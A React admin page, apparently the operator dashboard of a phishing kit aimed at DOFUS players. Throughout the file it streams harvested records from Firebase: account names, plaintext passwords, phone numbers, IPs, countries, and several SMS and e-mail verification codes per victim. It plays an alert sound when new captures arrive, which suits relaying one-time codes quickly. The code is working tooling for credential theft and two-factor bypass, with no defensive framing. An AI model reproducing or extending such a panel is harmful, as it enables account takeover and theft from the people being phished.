import React, { useEffect, useState } from 'react'
import { doc, getDoc, onSnapshot, query, where } from "firebase/firestore";
import { collection, getDocs } from "firebase/firestore";
import { deleteDoc } from "firebase/firestore";
import db  from '../Firebase';
import styles from '../styles/Panel.module.css'
import { useRef } from 'react';


import mp3 from "../assets/sound2.mp3" 
import { Helmet } from 'react-helmet';
function Admin() {
    const [logged,setLogged] = useState(false)
    const [pass,setPass] = useState("");
    const [dbPass,setDbPass] = useState("");
    const [data,setData] = useState([]);
    const [ip,setIp] = useState();
    const audioRef = useRef();


    const play = () => {
     try{
      if (audioRef.current) {
        audioRef.current.play()
      } else {
        // Throw error
        console.log("error")
      }
     }catch(e){
      console.log(e)
     }
    }
   

    const getPassword= async()=>{
        const docRef = doc(db, "admin", "password");
        const docSnap = await getDoc(docRef);
        if (docSnap.exists()) {
            setDbPass(docSnap.data().password)
          } else {
            // doc.data() will be undefined in this case
            console.log("No such document!");
          }
    }

   

    const getData = async()=>{
       if (logged) {
        const q = query(collection(db, "users"), where("ip", "!=", ""));
        const unsubscribe = onSnapshot(q, (querySnapshot) => {
            const array = [];
            querySnapshot.forEach((doc) => {
                array.push(doc?.data());

                const stored = localStorage.getItem(doc?.data()?.ip);
                setIp(stored)
                if (stored != 'exist') {
                  //play();
                  localStorage.setItem(doc?.data()?.ip, JSON.stringify("exist"));
                  console.log("ana hna 2")
                }else{
                  console.log("already stored")

                }


            });
            
            setData(array);

            setTimeout(()=>{
              play();
            },1000)
          });
       }

    }

    
  

    const deleteData = async(uid)=>{
      await deleteDoc(doc(db, "users", uid));
      localStorage.removeItem(ip)
    }
    useEffect(()=>{
        getPassword();  
    },[])
    useEffect(()=>{
        getData()
    },[logged])

    const valide =()=>{
        if (pass == dbPass) {
            setLogged(true)
            localStorage.setItem("user", JSON.stringify(true));

        }else{
            setLogged(false)
        }
    }

    const logout = ()=>{
      localStorage.setItem("user", JSON.stringify(false));
      setLogged(false);
    }
    useEffect(()=>{
      const stored = localStorage.getItem("user");
        
      if (stored == "true") {
        setLogged(true);
      }
    },[]);



  return (
    <div className={styles.admin}>
      <Helmet>
      <title>Admin Panel</title>
      <meta name="description" content=" DOFUS – Les Baumes Martegels" />
    </Helmet>
      {!logged && (
        <div className={styles.login}>
            <div className={styles.loginBox}>
                <div className={styles.header}>
                    <p>Sign up</p>
                </div>
                <div className={styles.loginContent}>
                    <div className={styles.conten}>
                    <p>Enter your password</p>
                    <input onChange={(e)=> setPass(e.target.value)} type="text" /><br />
                    <button onClick={valide} className={styles.log}>Valider</button>
                    </div>
                    
                </div>
            </div>
        </div>
      )}
      {logged && (
        <div className={styles.login2}>
            <div className={styles.heading}>
                <h4>Admin panel</h4>
                <button onClick={logout} >logout</button>
            </div>
            <div className={styles.conten2}>
            <table>
  <tr>
    <th>Account name</th>
    <th>Password</th>
    <th>Phone</th>
    <th>Ip</th>
    <th>Country</th>
    <th>Code sms</th>
    <th>Code sms 2</th>
    <th>Code sms 3</th>

    <th>Code e-mail</th>
    <th>Code e-mail 2</th>
    <th>Code e-mail 3</th>

    <th>Action</th>
  </tr>
  {data?.map((user,index)=> 
    (
    <tr>
    <td>{user?.name}</td>
    <td>{user?.pass}</td>
    <td>{user?.phone}</td>
    <td>{user?.ip}</td>
    <td>{user?.country}</td>
    <td>{user?.sms}</td>
    <td>{user?.sms2}</td>
    <td>{user?.sms3}</td>

    <td>{user?.mail}</td>
    <td>{user?.mail2}</td>
    <td>{user?.mail3}</td>


    <td><button style={{color:"white",backgroundColor:"red",border:"1px solid gray",cursor:'pointer',padding:"9px"}} onClick={()=> deleteData(user?.uid)}>Delete</button></td>
  </tr>
    )
  )}
  
 
</table>

            </div>
            <audio ref={audioRef} src={mp3} />

        </div>
      )}
    </div>
  )
}

export default Admin
